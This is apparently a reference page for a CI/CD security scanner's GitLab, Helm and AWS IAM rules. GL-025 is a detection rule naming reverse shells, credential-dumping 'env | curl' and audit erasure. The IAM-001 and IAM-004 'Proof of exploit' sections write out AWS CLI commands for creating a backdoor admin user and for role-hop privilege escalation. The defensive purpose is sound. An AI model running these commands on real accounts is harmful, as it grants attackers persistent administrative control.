**Source:** [`GL-017`](../providers/gitlab.md#gl-017) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-018 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-018`](../providers/gitlab.md#gl-018) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-019`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-019 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`GL-019`](../providers/gitlab.md#gl-019) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-020`: CI_JOB_TOKEN written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-020 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Detects patterns where `CI_JOB_TOKEN` is redirected to a file, piped through `tee`, or appended to dotenv/artifact paths. Persisted tokens survive the job boundary and can be read by later stages, downloaded artifacts, or cache entries, turning a scoped credential into a long-lived one.

**Recommendation.** Never write CI_JOB_TOKEN to files, artifacts, or dotenv reports. Use the token inline in the command that needs it and let GitLab revoke it automatically when the job finishes.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-020`](../providers/gitlab.md#gl-020) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-021 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-021`](../providers/gitlab.md#gl-021) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-022 }

**Evidences:** [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`GL-022`](../providers/gitlab.md#gl-022) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-023 }

**Evidences:** [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-023`](../providers/gitlab.md#gl-023) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-024 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** ``cosign sign`` and ``cosign attest`` look similar but mean different things: the first binds identity to bytes; the second binds a structured claim (builder, source, inputs) to the artifact. SLSA Build L3 verifiers check the latter.

**Recommendation.** Add a job that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or adopt a SLSA-aware builder (the SLSA project ships GitLab templates). Signing the artifact (GL-006) isn't enough for SLSA L3, the attestation describes *how* the build ran.

**Source:** [`GL-024`](../providers/gitlab.md#gl-024) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-025`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-025 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Fires on concrete indicators (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, ``webhook.site`` callbacks, ``env | curl`` credential dumps, ``history -c`` audit erasure). Orthogonal to GL-003 (curl pipe) and GL-017 (Docker insecure flags). Those flag risky defaults; this flags evidence.

**Recommendation.** Treat as a potential compromise. Identify the MR that added the matching job(s), rotate any credentials the pipeline can reach, and audit recent runs for outbound traffic to the matched hosts. A legitimate red-team exercise should be time-bounded via ``.pipelinecheckignore`` with ``expires:``.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`GL-025`](../providers/gitlab.md#gl-025) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-026 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** ``eval``, ``sh -c "$X"``, and `` `$X` `` all re-parse the variable's value as shell syntax. Once a CI variable feeds into one of these idioms, any ``;``, ``&&``, ``|``, backtick, or ``$()`` in the value executes, even if the variable's source is currently trusted, future refactors may expose it.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec of variables with direct command invocation. If the command must be dynamic, pass arguments as array members or validate the input against an allow-list at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`GL-026`](../providers/gitlab.md#gl-026) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-027 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Complements GL-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs all bypass the registry integrity controls the lockfile relies on, an attacker who can move a branch head, drop a sibling checkout, or change a served tarball can substitute code into the build.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`GL-027`](../providers/gitlab.md#gl-027) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-028`: services: image not pinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-028 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** ``services:`` entries (top-level or per-job) can be either a string (``redis:7``) or a dict (``{name: redis:7, alias: cache}``). Both forms are normalized via ``image_ref``-style extraction and evaluated with the same floating-tag regex GL-001 uses for ``image:``.

**Recommendation.** Pin every ``services:`` entry the same way ``image:`` is pinned, prefer ``@sha256:<digest>``, or at minimum a full immutable version tag (``postgres:16.2-alpine``). Avoid ``:latest`` and bare tags like ``:16``.

**Source:** [`GL-028`](../providers/gitlab.md#gl-028) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-030`: trigger: include: pulls child pipeline without pinned ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-030 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** GL-005 only audits top-level ``include:``. Parent-child and multi-project pipelines that load YAML via the job-level ``trigger: include:`` slot slip through. Branch refs (``main``/``master``/``develop``/``head``) count as unpinned.

**Recommendation.** Pin ``trigger: include: project:`` entries with ``ref:`` set to a tag or commit SHA. Avoid ``trigger: include: remote:`` for untrusted URLs; mirror the content into a trusted project and pin it there.

**Source:** [`GL-030`](../providers/gitlab.md#gl-030) in the [GitLab CI provider](../providers/gitlab.md).

#### `HELM-001`: Chart.yaml declares legacy apiVersion: v1 <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** ``apiVersion`` lives at the top of ``Chart.yaml``. ``v1`` is Helm 2's format and uses a sibling ``requirements.yaml`` for dependencies; ``v2`` is Helm 3's format and inlines them in ``Chart.yaml`` alongside a ``Chart.lock`` for digest pinning. Without v2 there is no in-tree dependency manifest to lock, which is why HELM-002 only fires on v2 charts.

**Recommendation.** Bump ``Chart.yaml`` to ``apiVersion: v2`` and migrate any sibling ``requirements.yaml`` entries into the ``dependencies:`` list inside ``Chart.yaml``. Run ``helm dependency update`` to regenerate ``Chart.lock`` so HELM-002's per-dependency digest check has something to read. Helm 3 has been the default shipping channel since November 2019; the v1 format is kept for read-compat but blocks lockfile-based supply-chain controls.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`HELM-001`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-002`: Chart.lock missing per-dependency digests <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-002 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Three failure shapes:

1. ``Chart.yaml`` declares dependencies but no ``Chart.lock`` exists at all.
2. ``Chart.lock`` exists but its ``dependencies:`` list is missing entries declared in ``Chart.yaml`` (drift after an edit without re-running ``helm dependency update``).
3. ``Chart.lock`` lists every dependency but one or more entries lack a ``digest:`` field (lock generated by an old Helm 3 version that didn't always populate it).

v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirements.lock`` against a sibling ``requirements.yaml``. Fix HELM-001 first.

**Recommendation.** After every change to ``dependencies:`` in ``Chart.yaml``, re-run ``helm dependency update`` and commit the regenerated ``Chart.lock``. The lock records the resolved version *and* a ``sha256:...`` digest that ``helm dependency build`` verifies on download, without it, a compromised chart repo can swap the tarball under the same version and ``helm install`` will happily use the substitute.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Charts with no dependencies (the ``dependencies:`` key is absent or empty) pass automatically. There is nothing to lock.

**Source:** [`HELM-002`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-003`: Chart dependency declared on a non-HTTPS repository <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-003 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Walks ``Chart.yaml`` ``dependencies:`` (v2 charts only) and inspects each entry's ``repository:`` URL. Accepted schemes:

- ``https://``, chart-museum / OSS chart repos. The default for public Helm charts.
- ``oci://``, registry-hosted charts. TLS is enforced by the registry, not the URL scheme; we still accept this shape because Helm 3.8+ pulls OCI charts over HTTPS unless explicitly configured otherwise.
- ``file://``, in-repo dependency. No network surface.
- ``@alias``, local alias for a previously registered ``helm repo add`` URL. The scheme of the original URL is the user's responsibility (and is captured in the chart consumer's ``~/.config/helm/repositories.yaml``).

**Recommendation.** Switch each ``dependencies[].repository`` value to an ``https://`` chart repo URL, an ``oci://`` registry reference, or a ``file://`` path for in-repo charts. Plaintext ``http://`` (and other non-TLS schemes like ``git://``) lets any on-path attacker substitute the dependency tarball during ``helm dependency build``; ``Chart.lock``'s digest check (HELM-002) only catches that on the *next* update, not the compromised pull itself.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`HELM-003`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-004`: Chart dependency version is a range, not an exact pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-helm-004 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** An exact pin is a string that contains only digits, dots, and at most a single leading ``v`` / trailing pre-release or build identifier (``1.2.3``, ``v1.2.3``, ``1.2.3-rc1``, ``1.2.3+build.5``). Anything carrying ``^`` / ``~`` / ``>`` / ``<`` / ``*`` / ``x`` / ``X`` / ``||`` / a space (``>=4 <5``) is treated as a range. The bias is toward false positives, a chart maintainer can suppress per-rule via ``--ignore-file`` if they specifically want range semantics, but the default for production charts is a pin.

**Recommendation.** Replace each ``dependencies[].version`` constraint with the exact resolved version from ``Chart.lock``. ``17.0.0`` instead of ``^17.0.0``, ``v1.2.3`` instead of ``~1.2``. Range syntax (``^``, ``~``, ``>=``, ``*``, ``x``) lets ``helm dependency update`` move every consumer of the chart to a newer dep on the next refresh, even when the lock file looked stable.

**Source:** [`HELM-004`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-005`: Chart maintainers field empty or missing chain-of-custody info <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-005 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** An ``maintainers:`` entry is considered usable when the value is a YAML mapping with ``name:`` set to a non-empty string and at least one of ``email:`` / ``url:`` populated. Entries that look like ``- name: TODO`` or carry blank contact fields fail the rule the same way a missing block does, the field exists but doesn't carry a real chain-of-custody signal.

**Recommendation.** Populate ``maintainers:`` in ``Chart.yaml`` with at least one entry carrying a ``name`` plus either an ``email`` or a ``url``. The ``name`` is the human a downstream consumer files an issue against; the contact field is the channel they reach. Charts published to ArtifactHub or an internal registry without this field are silently anonymous, fine for a personal scratch chart, not for one your CI pipeline will deploy to production.

**Known false positives.**

- Library charts (``Chart.yaml`` ``type: library``) often ship without maintainers when distributed inside a single team's monorepo where the org-level CODEOWNERS already names the contact. Suppress with ``--ignore-file`` when this matches your situation.

**Source:** [`HELM-005`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-006`: Chart.yaml does not declare a kubeVersion compatibility range <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-006 }

**Evidences:** [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** The field is a string carrying a Helm-flavoured SemVer range. Empty / missing fails the rule. Whitespace-only values fail too, an obviously-blank key should not satisfy a posture check.

**Recommendation.** Add a ``kubeVersion:`` SemVer range to ``Chart.yaml`` covering the Kubernetes versions you've actually rendered and tested the chart against. ``>= 1.25.0 < 1.32.0`` is the common shape for a chart maintained against the upstream support window. Helm will refuse ``helm install`` against a cluster whose ``kubectl version`` falls outside the range, catching silent-breakage surprises (removed apiVersions, renamed RBAC verbs, alpha features) at pre-flight rather than at runtime.

**Known false positives.**

- Library charts (``Chart.yaml`` ``type: library``) that wrap version-agnostic helpers often legitimately ship without ``kubeVersion``. Suppress with ``--ignore-file`` when the chart genuinely targets every supported Kubernetes minor.

**Source:** [`HELM-006`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-007`: Chart.yaml description field is empty or missing <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-007 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Walks ``Chart.yaml`` ``description:`` and fires when the field is missing, ``None``, or a string that's empty after stripping whitespace. The Helm chart spec doesn't enforce the field but every chart published to ArtifactHub or the upstream stable repo populates it; production charts that ship without it are usually a copy-paste-from-template oversight.

**Recommendation.** Set ``description:`` in ``Chart.yaml`` to a one-sentence summary of what the chart deploys (e.g. ``description: Postgres 14 cluster with WAL-G backups and a Prometheus exporter``). Helm registries display this string in chart listings; without it, anyone browsing has to read the README to figure out what the chart does.

**Source:** [`HELM-007`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-008`: Chart.lock generated more than 90 days ago <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-helm-008 }

**Evidences:** [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Reads ``Chart.lock``'s top-level ``generated:`` timestamp (an ISO-8601 string Helm writes when the lock was last regenerated) and compares against ``now``. Fires when the delta is more than 90 days. Charts without ``Chart.lock`` are skipped. HELM-002 covers the missing-lock case directly. Charts whose ``generated:`` field is malformed or absent silently pass on this rule (HELM-002 covers the absent-lock case from a different angle).

**Recommendation.** Run ``helm dependency update`` against every dependency-carrying chart at least once per release cycle, and commit the regenerated ``Chart.lock``. The lock pins versions and digests; the *update cadence* is what brings in CVE fixes and deprecation notices from the last quarter. CI can run the same command against ``main`` weekly to surface drift as a PR rather than letting the lock sit stale until the next release.

**Known false positives.**

- A chart that pins exact versions and never needs new dependencies (e.g. a chart packaging a single internal library that itself updates rarely) may legitimately have a stale Chart.lock. Suppress with ``--ignore-file`` when this matches your situation.

**Source:** [`HELM-008`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-009`: Chart home / sources URL uses a non-HTTPS scheme <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-009 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Walks ``Chart.yaml`` ``home:`` (single string) and ``sources:`` (list of strings). Fires on any value whose scheme is ``http://``, ``ftp://``, or other plaintext form. Empty / missing fields pass, the rule only evaluates URLs that are *populated* with the wrong scheme. HELM-003 covers the same risk for dependency-repo URLs.

**Recommendation.** Switch every ``home:`` URL and every entry in ``sources:`` to ``https://``. Most chart-listing UIs display these as click-through links from a public chart registry; serving them over plaintext is a confused-deputy footgun for anyone evaluating the chart's provenance. ``http://`` URLs against ``localhost`` are not exempted, production charts shouldn't ship references to a developer-local endpoint anyway.

**Source:** [`HELM-009`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-010`: Chart.yaml appVersion field is empty or missing <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-010 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Library charts (``Chart.yaml`` ``type: library``) legitimately don't have an ``appVersion`` because they package no application. Those are exempted. For application charts (``type: application``, the default), ``appVersion`` is required for CVE tracking and release-tracking; without it, ``helm list`` shows ``-`` in the AppVersion column and downstream consumers have no signal.

**Recommendation.** Set ``appVersion:`` in ``Chart.yaml`` to the version of the application the chart packages (e.g. ``appVersion: "17.2"`` for a Postgres-17.2 chart at ``version: 1.4.2``). When the upstream application releases, bump ``appVersion`` and re-cut the chart. Helm's CLI displays ``appVersion`` alongside the chart version in ``helm list``, so downstream operators can see which app version is running where.

**Source:** [`HELM-010`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `IAM-001`: CI/CD role has AdministratorAccess policy attached <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-iam-001 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** A CI/CD service role with ``AdministratorAccess`` attached turns any pipeline compromise into account compromise. The classic anti-pattern: the role started narrow, the pipeline grew, someone attached AdministratorAccess to unblock a deploy, and it never came off.

**Recommendation.** Replace AdministratorAccess with least-privilege policies.

**Proof of exploit.**

# Vulnerable: CodeBuild service role with AdministratorAccess.
# (Terraform shown for clarity; the actual finding comes from
# live ListAttachedRolePolicies on the role.)
resource "aws_iam_role" "codebuild" {
  name               = "codebuild-deploy"
  assume_role_policy = data.aws_iam_policy_document.cb_trust.json
}
resource "aws_iam_role_policy_attachment" "admin" {
  role       = aws_iam_role.codebuild.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# Attack: any compromise of the build (poisoned dependency,
# leaked buildspec edit, malicious PR merged to the branch
# CodeBuild trusts) runs as a principal with full account
# permissions. From a build shell:
#
#   aws iam create-user --user-name persistence
#   aws iam attach-user-policy --user-name persistence \
#     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
#   aws iam create-access-key --user-name persistence
#
# Game over: out-of-band admin, no IP gate, survives every
# subsequent rotation of the CodeBuild role itself.

# Safe: scope the role to the resources the pipeline actually
# touches. ``AdministratorAccess`` is never the right answer
# for an automation principal.
resource "aws_iam_role_policy" "codebuild_least_priv" {
  role   = aws_iam_role.codebuild.id
  policy = data.aws_iam_policy_document.deploy_specific.json
}

**Source:** [`IAM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-002`: CI/CD role has wildcard Action in attached policy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-002 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** ``Action: '*'`` (or service-prefix wildcards like ``s3:*``) on an attached policy is functionally equivalent to AdministratorAccess for that resource. The wildcard absorbs every new IAM action AWS adds, so the role's authority grows without any local change.

**Recommendation.** Replace wildcard actions with specific IAM actions.

**Source:** [`IAM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-003`: CI/CD role has no permission boundary <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-003 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** A permissions boundary is the maximum-permission ceiling for a role. Without one, every future PR that attaches another inline / managed policy raises the role's effective authority indefinitely. With a boundary in place, the policy churn happens beneath a fixed cap that your security team owns separately.

**Recommendation.** Attach a permissions boundary defining max permissions.

**Source:** [`IAM-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-004`: CI/CD role can PassRole to any role <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-004 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** ``iam:PassRole`` with ``Resource: '*'`` lets the principal hand any role to any service. Combined with a service that runs your code (Lambda, ECS, CodeBuild, EC2 Instance Profiles), this is role-hop privilege escalation: launch an ephemeral resource configured with a higher-privileged role, run code under that identity, exfil. Scoping by ARN + ``iam:PassedToService`` removes the escalation path.

**Recommendation.** Restrict iam:PassRole to specific role ARNs and add an iam:PassedToService condition.

**Proof of exploit.**

# Vulnerable: pipeline role grants PassRole with Resource: '*'.
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["iam:PassRole", "lambda:CreateFunction",
                "lambda:InvokeFunction"],
    "Resource": "*"
  }]
}

# Attack: from a build shell, create a Lambda configured with
# the highest-privileged role you can name and invoke it:
#
#   aws lambda create-function --function-name pwn \
#     --role arn:aws:iam::123456789012:role/prod-admin \
#     --runtime python3.12 --handler i.h \
#     --zip-file fileb://payload.zip
#   aws lambda invoke --function-name pwn /tmp/out
#
# The Lambda now runs as ``prod-admin`` even though the
# pipeline principal never had that role's permissions
# directly. Classic role-hop privilege escalation.

# Safe: pin to one role ARN AND require the pass be scoped
# to the service that legitimately consumes it.
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::123456789012:role/lambda-deploy-target",
  "Condition": {
    "StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}
  }
}

**Source:** [`IAM-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-005`: CI/CD role trust policy missing sts:ExternalId <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-005 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed, [`PR.AA-03`](#ctrl-pr-aa-03) Users, services, and hardware are authenticated.

**How this is detected.** A trust policy that lets an external AWS account assume the role without an ``sts:ExternalId`` condition is vulnerable to the confused-deputy pattern: a third-party SaaS configured with your role ARN can also be used by another customer of that SaaS to assume your role (if they know the ARN). ``sts:ExternalId`` ties the role to a specific tenancy.

**Recommendation.** Add a Condition requiring sts:ExternalId for external principals.

**Source:** [`IAM-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-006`: Sensitive actions granted with wildcard Resource <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-006 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** IAM-002 catches ``Action: "*"``. IAM-006 catches the more common "scoped action, unscoped resource" pattern on sensitive services (S3/KMS/SecretsManager/SSM/IAM/STS/DynamoDB/Lambda/EC2).

**Recommendation.** Scope the Resource element to specific ARNs (buckets, keys, secrets, roles).

**Source:** [`IAM-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-007`: IAM user has access key older than 90 days <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-007 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Every user in the account is evaluated. CI/CD tooling that still uses IAM users (older Jenkins agents, GitHub Actions pre-OIDC, third-party schedulers) shows up here. The 90-day window matches the common compliance baseline; rotate sooner if the key is used from on-prem or an untrusted runner.

**Recommendation.** Rotate or delete IAM access keys older than 90 days. Long-lived static credentials are the #1 way compromised CI credentials get reused across environments, prefer short-lived STS tokens via OIDC federation or an assumed role.

**Source:** [`IAM-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

